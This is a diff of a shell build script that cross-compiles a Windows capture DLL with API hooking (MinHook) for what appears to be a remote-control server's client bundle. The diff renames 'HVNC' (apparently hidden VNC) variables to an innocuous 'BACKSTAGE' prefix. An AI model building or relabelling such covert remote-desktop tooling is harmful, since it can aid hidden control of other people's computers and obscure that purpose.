@@ -21,12 +21,12 @@ cd "$ROOT"
 # C++ compiler for COM / __uuidof support
 CXX="${CXX:-x86_64-w64-mingw32-g++}"
 CC="${CC:-x86_64-w64-mingw32-gcc}"
-SRC_DIR="${HVNC_CAPTURE_SRC_DIR:-BackstageCapture/src}"
-OUT_DIR="${HVNC_CAPTURE_OUT_DIR:-Overlord-Server/dist-clients}"
+SRC_DIR="${BACKSTAGE_CAPTURE_SRC_DIR:-BackstageCapture/src}"
+OUT_DIR="${BACKSTAGE_CAPTURE_OUT_DIR:-Overlord-Server/dist-clients}"
 DLL_NAME="BackstageCapture.x64.dll"
 MINHOOK_REPO="${MINHOOK_REPO:-https://github.com/TsudaKageyu/minhook.git}"
 MINHOOK_REF="${MINHOOK_REF:-master}"
-HVNC_FETCH_MINHOOK="${HVNC_FETCH_MINHOOK:-1}"
+BACKSTAGE_FETCH_MINHOOK="${BACKSTAGE_FETCH_MINHOOK:-1}"
 MINHOOK_STATIC_DIR="${MINHOOK_STATIC_DIR:-BackstageCapture/Minhook}"
 
 mkdir -p "$OUT_DIR"
@@ -100,7 +100,7 @@ if ! command -v "$CXX" >/dev/null 2>&1; then
 fi
 
 fetch_minhook() {
-  if [ "$HVNC_FETCH_MINHOOK" != "1" ]; then
+  if [ "$BACKSTAGE_FETCH_MINHOOK" != "1" ]; then
     return 1
   fi
 
